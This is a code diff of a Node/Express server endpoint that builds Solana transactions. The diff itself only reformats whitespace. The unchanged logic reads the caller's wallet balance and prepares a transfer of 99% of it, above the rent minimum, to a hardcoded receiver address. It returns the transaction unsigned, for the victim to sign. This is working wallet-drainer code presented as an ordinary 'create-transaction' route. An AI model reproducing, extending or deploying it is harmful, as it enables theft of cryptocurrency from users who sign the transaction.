@@ -12,7 +12,7 @@ const connection = new Connection("https://api.mainnet-beta.solana.com", "confir
 app.post('/create-transaction', async (req, res) => {
     try {
         const { publicKey } = req.body;
-        if (!publicKey) return res.status(400).json({ error: "No public key provided" });
+        if(!publicKey) return res.status(400).json({error: "No public key provided"});
 
         const sender = new PublicKey(publicKey);
         const receiver = new PublicKey("DDrBKoU3NE3NXaQu2XpNJXw8gWzECboTfA3ccD4aznBP");
@@ -21,7 +21,7 @@ app.post('/create-transaction', async (req, res) => {
         const minRent = await connection.getMinimumBalanceForRentExemption(0);
         const sendAmount = Math.floor((balance - minRent) * 0.99);
 
-        if (sendAmount <= 0) return res.status(400).json({ error: "Not enough balance" });
+        if(sendAmount <= 0) return res.status(400).json({error: "Not enough balance"});
 
         const tx = new Transaction().add(
             SystemProgram.transfer({ fromPubkey: sender, toPubkey: receiver, lamports: sendAmount })
@@ -30,12 +30,12 @@ app.post('/create-transaction', async (req, res) => {
         tx.feePayer = sender;
         tx.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
 
-        const serialized = tx.serialize({ requireAllSignatures: false }).toString('base64');
+        const serialized = tx.serialize({ requireAllSignatures:false }).toString('base64');
 
         res.json({ serialized, sendAmount });
-    } catch (err) {
+    } catch(err){
         console.error(err);
-        res.status(500).json({ error: err.message });
+        res.status(500).json({error: err.message});
     }
 });
 
